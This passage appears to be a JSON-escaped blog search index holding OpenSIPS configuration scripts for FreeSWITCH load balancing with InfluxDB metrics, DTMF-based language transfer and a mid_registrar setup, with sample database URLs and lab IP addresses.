\u0026#34;mi_fifo.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo_2\u0026#34;) modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_mode\u0026#34;, 0666) #### URI module loadmodule \u0026#34;uri.so\u0026#34; modparam(\u0026#34;uri\u0026#34;, \u0026#34;use_uri_table\u0026#34;, 0) loadmodule \u0026#34;cfgutils.so\u0026#34; #### USeR LOCation module loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;nat_bflag\u0026#34;, \u0026#34;NAT\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) #### REGISTRAR module loadmodule \u0026#34;registrar.so\u0026#34; modparam(\u0026#34;registrar\u0026#34;, \u0026#34;tcp_persistent_flag\u0026#34;, \u0026#34;TCP_PERSISTENT\u0026#34;) /* uncomment the next line not to allow more than 10 contacts per AOR */ #modparam(\u0026#34;registrar\u0026#34;, \u0026#34;max_contacts\u0026#34;, 10) #### ACCounting module loadmodule \u0026#34;acc.so\u0026#34; /* what special events should be accounted ? */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) /* by default we do not adjust the direct of the sequential requests. if you enable this parameter, be sure the enable \u0026#34;append_fromtag\u0026#34; in \u0026#34;rr\u0026#34; module */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) loadmodule \u0026#34;proto_udp.so\u0026#34; loadmodule \u0026#34;dialog.so\u0026#34; loadmodule \u0026#34;statistics.so\u0026#34; loadmodule \u0026#34;load_balancer.so\u0026#34; modparam(\u0026#34;load_balancer\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://opensips:opensipsrw@192.168.56.128/opensips\u0026#34;) modparam(\u0026#34;load_balancer\u0026#34;, \u0026#34;initial_freeswitch_load\u0026#34;, 15) modparam(\u0026#34;load_balancer\u0026#34;, \u0026#34;fetch_freeswitch_stats\u0026#34;, 1) loadmodule \u0026#34;freeswitch.so\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; ####### Routing Logic ######## # main request routing logic startup_route { $stat(neg_replies) = 0; } route { if ($stat(neg_replies) == \u0026#34;\u0026lt;null\u0026gt;\u0026#34;) $stat(neg_replies) = 0; if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; } if (has_totag()) { # handle hop-by-hop ACK (no routing required) if ( is_method(\u0026#34;ACK\u0026#34;) \u0026amp;\u0026amp; t_check_trans() ) { t_relay(); exit; } # sequential request within a dialog should # take the path determined by record-routing if ( !loose_route() ) { # we do record-routing for all our traffic, so we should not # receive any sequential requests without Route hdr. sl_send_reply(\u0026#34;404\u0026#34;,\u0026#34;Not here\u0026#34;); exit; } if (is_method(\u0026#34;BYE\u0026#34;)) { # do accounting even if the transaction fails do_accounting(\u0026#34;log\u0026#34;,\u0026#34;failed\u0026#34;); } # route it out to whatever destination was set by loose_route() # in $du (destination URI). route(relay); exit; } # CANCEL processing if (is_method(\u0026#34;CANCEL\u0026#34;)) { if (t_check_trans()) t_relay(); exit; } t_check_trans(); if ( !(is_method(\u0026#34;REGISTER\u0026#34;) ) ) { if (is_myself(\u0026#34;$fd\u0026#34;)) { } else { # if caller is not local, then called number must be local if (!is_myself(\u0026#34;$rd\u0026#34;)) { send_reply(\u0026#34;403\u0026#34;,\u0026#34;Rely forbidden\u0026#34;); exit; } } } # preloaded route checking if (loose_route()) { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Attempt to route with preloaded Route\u0026#39;s [$fu/$tu/$ru/$ci]\u0026#34;); if (!is_method(\u0026#34;ACK\u0026#34;)) sl_send_reply(\u0026#34;403\u0026#34;,\u0026#34;Preload Route denied\u0026#34;); exit; } # record routing if (!is_method(\u0026#34;REGISTER|MESSAGE\u0026#34;)) record_route(); # account only INVITEs if (is_method(\u0026#34;INVITE\u0026#34;)) { create_dialog(); $dlg_val(start_ts) = $Ts; $dlg_val(start_tsm) = $Tsm; $dlg_val(pdd_pen) = \u0026#34;0\u0026#34;; t_on_reply(\u0026#34;invite_reply\u0026#34;); do_accounting(\u0026#34;log\u0026#34;); } if (!is_myself(\u0026#34;$rd\u0026#34;)) { append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); route(relay); } # requests for my domain if (is_method(\u0026#34;PUBLISH|SUBSCRIBE\u0026#34;)) { sl_send_reply(\u0026#34;501\u0026#34;, \u0026#34;Not Implemented\u0026#34;); exit; } if (is_method(\u0026#34;REGISTER\u0026#34;)) { if (!save(\u0026#34;location\u0026#34;)) sl_reply_error(); exit; } if ($rU==NULL) { # request with no Username in RURI sl_send_reply(\u0026#34;484\u0026#34;,\u0026#34;Address Incomplete\u0026#34;); exit; } if (!load_balance(\u0026#34;2\u0026#34;, \u0026#34;call\u0026#34;)) { xlog(\u0026#34;no available destinations!\\n\u0026#34;); send_reply(\u0026#34;503\u0026#34;, \u0026#34;No available dsts\u0026#34;); exit; } # when routing via usrloc, log the missed calls also do_accounting(\u0026#34;log\u0026#34;,\u0026#34;missed\u0026#34;); route(relay); } onreply_route [invite_reply] { if ($rs == 180) { if ($Ts == $(dlg_val(start_ts){s.int})) { $var(diff_sec) = 0; $var(diff_usec) = $Tsm - $(dlg_val(start_tsm){s.int}); } else if ($Tsm \u0026gt; $(dlg_val(start_tsm){s.int})) { $var(diff_sec) = $Ts - $(dlg_val(start_ts){s.int}); $var(diff_usec) = $Tsm - $(dlg_val(start_tsm){s.int}); } else { $var(diff_sec) = $Ts - $(dlg_val(start_ts){s.int}) - 1; $var(diff_usec) = 1000000 + $Tsm - $(dlg_val(start_tsm){s.int}); } $var(diff_usec) = $var(diff_usec) + $dlg_val(pdd_pen); cache_add(\u0026#34;local\u0026#34;, \u0026#34;tot_sec\u0026#34;, $var(diff_sec), 0, $var(nsv)); cache_add(\u0026#34;local\u0026#34;, \u0026#34;tot_usec\u0026#34;, $var(diff_usec), 0, $var(nmsv)); cache_add(\u0026#34;local\u0026#34;, \u0026#34;tot\u0026#34;, 1, 0); xlog(\u0026#34;XXXX: $var(diff_sec) s, $var(diff_usec) us | $var(nsv) | $var(nmsv)\\n\u0026#34;); } } route[relay] { # for INVITEs enable some additional helper routes if (is_method(\u0026#34;INVITE\u0026#34;)) { t_on_branch(\u0026#34;per_branch_ops\u0026#34;); t_on_failure(\u0026#34;missed_call\u0026#34;); } if (!t_relay()) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Internal Error\u0026#34;); } exit; } branch_route[per_branch_ops] { xlog(\u0026#34;new branch at $ru\\n\u0026#34;); } onreply_route[handle_nat] { xlog(\u0026#34;incoming reply\\n\u0026#34;); } failure_route[missed_call] { if (t_was_cancelled()) { exit; } if (!math_eval(\u0026#34;$dlg_val(pdd_pen) + 10000\u0026#34;, \u0026#34;$dlg_val(pdd_pen)\u0026#34;)) { xlog(\u0026#34;math eval error $rc\\n\u0026#34;); } cache_add(\u0026#34;local\u0026#34;, \u0026#34;neg_replies\u0026#34;, 1, 0); if (t_check_status(\u0026#34;(5|6)[0-9][0-9]\u0026#34;) || (t_check_status(\u0026#34;408\u0026#34;) \u0026amp;\u0026amp; t_local_replied(\u0026#34;all\u0026#34;))) { xlog(\u0026#34;ERROR: FS GW error, status=$rs\\n\u0026#34;); if (!lb_next()) { xlog(\u0026#34;ERROR: all FS are down!\\n\u0026#34;); send_reply(\u0026#34;503\u0026#34;, \u0026#34;No available destination\u0026#34;); exit; } } xlog(\u0026#34;rerouting to $ru / $du\\n\u0026#34;); t_on_reply(\u0026#34;invite_reply\u0026#34;); t_on_failure(\u0026#34;missed_call\u0026#34;); t_relay(); exit; # uncomment the following lines if you want to block client # redirect based on 3xx replies. ##if (t_check_status(\u0026#34;3[0-9][0-9]\u0026#34;)) { ##t_reply(\u0026#34;404\u0026#34;,\u0026#34;Not found\u0026#34;); ##\texit; ##} } timer_route [dump_pdd, 1] { $var(out) = 0; $var(out_us) = 0; $var(tot) = 0; $var(result) = 0; cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;tot_sec\u0026#34;, $var(out)); cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;tot_usec\u0026#34;, $var(out_us)); cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;tot\u0026#34;, $var(tot)); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;tot_sec\u0026#34;); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;tot_usec\u0026#34;); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;tot\u0026#34;); if ($var(tot) \u0026gt; 0) { if (!math_eval(\u0026#34;($var(out) + ($var(out_us) / 1000000)) / $var(tot)\u0026#34;, \u0026#34;$var(result)\u0026#34;)) { xlog(\u0026#34;math eval error $rc\\n\u0026#34;); } route(store_influxdb, \u0026#34;fsdemo\u0026#34;, \u0026#34;pdd\u0026#34;, \u0026#34;serverB\u0026#34;, $var(result)); } } #route [lb_route] #{ #\txlog(\u0026#34;foo: $(avp(lb_loads)[*])\\n\u0026#34;); #\troute(store_influxdb, \u0026#34;fsdemo\u0026#34;, \u0026#34;bal\u0026#34;, \u0026#34;serverA\u0026#34;, $(avp(lb_loads)[0])); #\tif ($(avp(lb_loads)[1]) != NULL) { #\troute(store_influxdb, \u0026#34;fsdemo\u0026#34;, \u0026#34;bal\u0026#34;, \u0026#34;serverB\u0026#34;, $(avp(lb_loads)[1])); #\t} #} route [store_influxdb] { $var(body) = $param(2) + \u0026#34;,host=\u0026#34; + $param(3) + \u0026#34; value=\u0026#34; + $param(4); xlog(\u0026#34;XXX posting: $var(body) ($param(1) / $param(2) / $param(4))\\n\u0026#34;); if (!rest_post(\u0026#34;http://localhost:8086/write?db=$param(1)\u0026#34;, \u0026#34;$var(body)\u0026#34;, , \u0026#34;$var(body)\u0026#34;)) { xlog(\u0026#34;ERR in rest_post!\\n\u0026#34;); exit; } } timer_route [dump_reply_stats, 1] { $var(nr) = 0; cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;neg_replies\u0026#34;, $var(nr)); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;neg_replies\u0026#34;); route(store_influxdb, \u0026#34;fsdemo\u0026#34;, \u0026#34;neg\u0026#34;, \u0026#34;serverB\u0026#34;, $var(nr)); route(store_influxdb, \u0026#34;fsdemo\u0026#34;, \u0026#34;rpl\u0026#34;, \u0026#34;serverB\u0026#34;, $stat(rcv_replies)); xlog(\u0026#34;XXX stats: $var(nr)\\n\u0026#34;); } ","permalink":"https://wdd.js.org/opensips/ch8/fs-loadbalance/","summary":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 memdump=1 log_stderror=yes log_facility=LOG_LOCAL0 children=10 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:192.","title":"cluecon-fslb"},{"content":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=4 log_stderror=no log_facility=LOG_LOCAL0 children=4 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen = udp:10.0.0.10:5060 ####### Modules Section ######## #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; #### SIGNALING module loadmodule \u0026#34;signaling.so\u0026#34; #### StateLess module loadmodule \u0026#34;sl.so\u0026#34; #### Transaction Module loadmodule \u0026#34;tm.so\u0026#34; modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timeout\u0026#34;, 5) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timeout\u0026#34;, 30) modparam(\u0026#34;tm\u0026#34;, \u0026#34;restart_fr_on_each_reply\u0026#34;, 0) modparam(\u0026#34;tm\u0026#34;, \u0026#34;onreply_avp_mode\u0026#34;, 1) #### Record Route Module loadmodule \u0026#34;rr.so\u0026#34; /* do not append from tag to the RR (no need for this script) */ modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) #### MAX ForWarD module loadmodule \u0026#34;maxfwd.so\u0026#34; #### SIP MSG OPerationS module loadmodule \u0026#34;sipmsgops.so\u0026#34; #### FIFO Management Interface loadmodule \u0026#34;mi_fifo.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_mode\u0026#34;, 0666) #### URI module loadmodule \u0026#34;uri.so\u0026#34; modparam(\u0026#34;uri\u0026#34;, \u0026#34;use_uri_table\u0026#34;, 0) #### USeR LOCation module loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;nat_bflag\u0026#34;, \u0026#34;NAT\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) #### REGISTRAR module loadmodule \u0026#34;registrar.so\u0026#34; modparam(\u0026#34;registrar\u0026#34;, \u0026#34;tcp_persistent_flag\u0026#34;, \u0026#34;TCP_PERSISTENT\u0026#34;) /* uncomment the next line not to allow more than 10 contacts per AOR */ #modparam(\u0026#34;registrar\u0026#34;, \u0026#34;max_contacts\u0026#34;, 10) #### ACCounting module loadmodule \u0026#34;acc.so\u0026#34; /* what special events should be accounted ? */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) /* by default we do not adjust the direct of the sequential requests. if you enable this parameter, be sure the enable \u0026#34;append_fromtag\u0026#34; in \u0026#34;rr\u0026#34; module */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) loadmodule \u0026#34;cachedb_local.so\u0026#34; loadmodule \u0026#34;freeswitch.so\u0026#34; loadmodule \u0026#34;freeswitch_scripting.so\u0026#34; modparam(\u0026#34;freeswitch_scripting\u0026#34;, \u0026#34;fs_subscribe\u0026#34;, \u0026#34;fs://:ClueCon@10.0.0.246:8021/database?DTMF,CHANNEL_STATE,CHANNEL_ANSWER,HEARTBEAT\u0026#34;) loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;cfgutils.so\u0026#34; loadmodule \u0026#34;drouting.so\u0026#34; modparam(\u0026#34;drouting\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://root:liviusmysqlpassword@localhost/opensips\u0026#34;) loadmodule \u0026#34;event_route.so\u0026#34; loadmodule \u0026#34;json.so\u0026#34; loadmodule \u0026#34;proto_udp.so\u0026#34; ####### Routing Logic ######## # main request routing logic # $param(1) - 1 if the R-URI IP:port should be rewritten route [goes_to_support] { if ($param(1) == 1) $var(flags) = \u0026#34;\u0026#34;; else $var(flags) = \u0026#34;C\u0026#34;; if (do_routing(\u0026#34;0\u0026#34;, \u0026#34;$var(flags)\u0026#34;)) return(1); return(-1); } route [FREESWITCH_XFER_BY_DTMF_LANG] { # this call has already been transferred if (cache_fetch(\u0026#34;local\u0026#34;, \u0026#34;DTMF-$json(body/Unique-ID)\u0026#34;, $var(_))) return; switch ($json(body/DTMF-Digit)) { case \u0026#34;1\u0026#34;: xlog(\u0026#34;transferring to English support line\\n\u0026#34;); freeswitch_esl(\u0026#34;bgapi uuid_transfer $json(body/Unique-ID) -aleg 1001\u0026#34;, \u0026#34;$var(fs_box)\u0026#34;, \u0026#34;$var(output)\u0026#34;); break; case \u0026#34;2\u0026#34;: xlog(\u0026#34;transferring to Spanish support line\\n\u0026#34;); freeswitch_esl(\u0026#34;bgapi uuid_transfer $json(body/Unique-ID) -aleg 1002\u0026#34;, \u0026#34;$var(fs_box)\u0026#34;, \u0026#34;$var(output)\u0026#34;); break; default: xlog(\u0026#34;DEFAULT: transferring to English support line\\n\u0026#34;); freeswitch_esl(\u0026#34;bgapi uuid_transfer $json(body/Unique-ID) -aleg 1001\u0026#34;, \u0026#34;$var(fs_box)\u0026#34;, \u0026#34;$var(output)\u0026#34;); } xlog(\u0026#34;ran FS uuid_transfer, output: $var(output)\\n\u0026#34;); cache_store(\u0026#34;local\u0026#34;, \u0026#34;DTMF-$json(body/Unique-ID)\u0026#34;, \u0026#34;OK\u0026#34;, 600); } event_route [E_FREESWITCH] { fetch_event_params(\u0026#34;$var(event_name);$var(fs_box);$var(event_body)\u0026#34;); xlog(\u0026#34;FreeSWITCH event $var(event_name) from $var(fs_box), with $var(event_body)\\n\u0026#34;); $json(body) := $var(event_body); if ($var(event_name) == \u0026#34;DTMF\u0026#34;) { $rU = $json(body/Caller-Destination-Number); if (!$rU) { xlog(\u0026#34;SCRIPT:DTMF:ERR: missing body/Caller-Destination-Number field!\\n\u0026#34;); return; } if (route(goes_to_support, 0)) route(FREESWITCH_XFER_BY_DTMF_LANG); } } route { if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; } if (has_totag()) { # handle hop-by-hop ACK (no routing required) if ( is_method(\u0026#34;ACK\u0026#34;) \u0026amp;\u0026amp; t_check_trans() ) { t_relay(); exit; } # sequential request within a dialog should # take the path determined by record-routing if ( !loose_route() ) { # we do record-routing for all our traffic, so we should not # receive any sequential requests without Route hdr. sl_send_reply(\u0026#34;404\u0026#34;,\u0026#34;Not here\u0026#34;); exit; } if (is_method(\u0026#34;BYE\u0026#34;)) { # do accounting even if the transaction fails do_accounting(\u0026#34;log\u0026#34;,\u0026#34;failed\u0026#34;); } # route it out to whatever destination was set by loose_route() # in $du (destination URI). route(relay); exit; } # CANCEL processing if (is_method(\u0026#34;CANCEL\u0026#34;)) { if (t_check_trans()) t_relay(); exit; } t_check_trans(); if ( !(is_method(\u0026#34;REGISTER\u0026#34;) ) ) { if (is_myself(\u0026#34;$fd\u0026#34;)) { } else { # if caller is not local, then called number must be local if (!is_myself(\u0026#34;$rd\u0026#34;)) { send_reply(\u0026#34;403\u0026#34;,\u0026#34;Rely forbidden\u0026#34;); exit; } } } # preloaded route checking if (loose_route()) { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Attempt to route with preloaded Route\u0026#39;s [$fu/$tu/$ru/$ci]\u0026#34;); if (!is_method(\u0026#34;ACK\u0026#34;)) sl_send_reply(\u0026#34;403\u0026#34;,\u0026#34;Preload Route denied\u0026#34;); exit; } # record routing if (!is_method(\u0026#34;REGISTER|MESSAGE\u0026#34;)) record_route(); # requests for my domain if (is_method(\u0026#34;PUBLISH|SUBSCRIBE\u0026#34;)) { sl_send_reply(\u0026#34;503\u0026#34;, \u0026#34;Service Unavailable\u0026#34;); exit; } if (is_method(\u0026#34;REGISTER\u0026#34;)) { if (!save(\u0026#34;location\u0026#34;)) sl_reply_error(); exit; } if (!is_method(\u0026#34;INVITE\u0026#34;)) { sl_send_reply(\u0026#34;405\u0026#34;, \u0026#34;Method Not Allowed\u0026#34;); exit; } do_accounting(\u0026#34;log\u0026#34;); if (!is_myself(\u0026#34;$rd\u0026#34;)) { append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); route(relay); } if ($rU==NULL) { # request with no Username in RURI sl_send_reply(\u0026#34;484\u0026#34;,\u0026#34;Address Incomplete\u0026#34;); exit; } # do lookup with method filtering if (!lookup(\u0026#34;location\u0026#34;,\u0026#34;m\u0026#34;)) { t_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); exit; } # when routing via usrloc, log the missed calls also do_accounting(\u0026#34;log\u0026#34;,\u0026#34;missed\u0026#34;); route(relay); } route[relay] { # for INVITEs enable some additional helper routes if (is_method(\u0026#34;INVITE\u0026#34;)) { t_on_branch(\u0026#34;per_branch_ops\u0026#34;); t_on_reply(\u0026#34;handle_nat\u0026#34;); t_on_failure(\u0026#34;missed_call\u0026#34;); } if (!t_relay()) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Internal Error\u0026#34;); }; exit; } branch_route[per_branch_ops] { xlog(\u0026#34;new branch at $ru\\n\u0026#34;); } onreply_route[handle_nat] { xlog(\u0026#34;incoming reply\\n\u0026#34;); } failure_route[missed_call] { if (t_was_cancelled()) { exit; } # uncomment the following lines if you want to block client # redirect based on 3xx replies. ##if (t_check_status(\u0026#34;3[0-9][0-9]\u0026#34;)) { ##t_reply(\u0026#34;404\u0026#34;,\u0026#34;Not found\u0026#34;); ##\texit; ##} } ","permalink":"https://wdd.js.org/opensips/ch8/dtmf-lan/","summary":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=4 log_stderror=no log_facility=LOG_LOCAL0 children=4 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen = udp:10.","title":"freeswitch-dtmf-language"},{"content":"# # $Id$ # # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=4 log_stderror=yes log_facility=LOG_LOCAL0 children=4 /* uncomment the following line to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:10.0.0.3:5060 # CUSTOMIZE ME ####### Modules Section ######## #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;mid_registrar.so\u0026#34; modparam(\u0026#34;mid_registrar\u0026#34;, \u0026#34;mode\u0026#34;, 2) /* 0 = mirror / 1 = ct / 2 = AoR */ modparam(\u0026#34;mid_registrar\u0026#34;, \u0026#34;outgoing_expires\u0026#34;, 7200) modparam(\u0026#34;mid_registrar\u0026#34;, \u0026#34;insertion_mode\u0026#34;, 0) /* 0 = contact; 1 = path */ #### SIGNALING module loadmodule \u0026#34;signaling.so\u0026#34; #### StateLess module loadmodule \u0026#34;sl.so\u0026#34; #### Transaction Module loadmodule \u0026#34;tm.so\u0026#34; modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timeout\u0026#34;, 5) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timeout\u0026#34;, 30) modparam(\u0026#34;tm\u0026#34;, \u0026#34;restart_fr_on_each_reply\u0026#34;, 0) modparam(\u0026#34;tm\u0026#34;, \u0026#34;onreply_avp_mode\u0026#34;, 1) #### Record Route Module loadmodule \u0026#34;rr.so\u0026#34; /* do not append from tag to the RR (no need for this script) */ modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) #### MAX ForWarD module loadmodule \u0026#34;maxfwd.so\u0026#34; #### SIP MSG OPerationS module loadmodule \u0026#34;sipmsgops.so\u0026#34; #### FIFO Management Interface loadmodule \u0026#34;mi_fifo.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_mode\u0026#34;, 0666) #### URI module loadmodule \u0026#34;uri.so\u0026#34; modparam(\u0026#34;uri\u0026#34;, \u0026#34;use_uri_table\u0026#34;, 0) #### USeR LOCation module loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;nat_bflag\u0026#34;, \u0026#34;NAT\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) #### REGISTRAR module loadmodule \u0026#34;registrar.so\u0026#34; /* uncomment the next line not to allow more than 10 contacts per AOR */ #modparam(\u0026#34;registrar\u0026#34;, \u0026#34;max_contacts\u0026#34;, 10) #### ACCounting module loadmodule \u0026#34;acc.so\u0026#34; /* what special events should be accounted ? */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) /* by default we do not adjust the direct of the sequential requests. if you enable this parameter, be sure the enable \u0026#34;append_fromtag\u0026#34; in \u0026#34;rr\u0026#34; module */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) #### UDP protocol loadmodule \u0026#34;proto_udp.so\u0026#34; ####### Routing Logic ######## # main request routing logic route{ if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; } if (has_totag()) { # sequential requests within a dialog should # take the path determined by record-routing if (loose_route()) { if (is_method(\u0026#34;BYE\u0026#34;)) { # do accunting, even if the transaction fails do_accounting(\u0026#34;log\u0026#34;,\u0026#34;failed\u0026#34;); } else if (is_method(\u0026#34;INVITE\u0026#34;)) { # even if in most of the cases is useless, do RR for # re-INVITEs alos, as some buggy clients do change route set # during the dialog. record_route(); } # route it out to whatever destination was set by loose_route() # in $du (destination URI). route(relay); } else { if ( is_method(\u0026#34;ACK\u0026#34;) ) { if ( t_check_trans() ) { # non loose-route, but stateful ACK; must be an ACK after # a 487 or e.g. 404 from upstream server t_relay(); exit; } else { # ACK without matching transaction -\u0026gt; # ignore and discard exit; } } sl_send_reply(\u0026#34;404\u0026#34;,\u0026#34;Not here\u0026#34;); } exit; } # CANCEL processing if (is_method(\u0026#34;CANCEL\u0026#34;)) { if (t_check_trans()) t_relay(); exit; } t_check_trans(); if (is_method(\u0026#34;REGISTER\u0026#34;)) { mid_registrar_save(\u0026#34;location\u0026#34;); switch ($retcode) { case 1: xlog(\u0026#34;forwarding REGISTER to main registrar ($$ci=$ci)\\n\u0026#34;); $ru = \u0026#34;sip:10.0.0.3:5070\u0026#34;; t_relay(); break; case 2: xlog(\u0026#34;absorbing REGISTER! ($$ci=$ci)\\n\u0026#34;); break; default: xlog(\u0026#34;failed to save registration! ($$ci=$ci)\\n\u0026#34;); } exit; } # preloaded route checking if (loose_route()) { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Attempt to route with preloaded Route\u0026#39;s [$fu/$tu/$ru/$ci]\u0026#34;); if (!is_method(\u0026#34;ACK\u0026#34;)) sl_send_reply(\u0026#34;403\u0026#34;,\u0026#34;Preload Route denied\u0026#34;); exit; } # record routing if (!is_method(\u0026#34;REGISTER|MESSAGE\u0026#34;)) record_route(); # account only INVITEs if (is_method(\u0026#34;INVITE\u0026#34;)) { do_accounting(\u0026#34;log\u0026#34;); } if (!uri==myself) { append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); route(relay); } # requests for my domain if (is_method(\u0026#34;PUBLISH|SUBSCRIBE\u0026#34;)) { sl_send_reply(\u0026#34;503\u0026#34;, \u0026#34;Service Unavailable\u0026#34;); exit; } if ($rU==NULL) { # request with no Username in RURI sl_send_reply(\u0026#34;484\u0026#34;,\u0026#34;Address Incomplete\u0026#34;); exit; } # initial requests from main registrar, need to look them up! if (is_method(\u0026#34;INVITE|MESSAGE\u0026#34;) \u0026amp;\u0026amp; $si == \u0026#34;10.0.0.3\u0026#34; \u0026amp;\u0026amp; $sp == 5070) { xlog(\u0026#34;looking up $ru!\\n\u0026#34;); if (!mid_registrar_lookup(\u0026#34;location\u0026#34;)) { t_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); 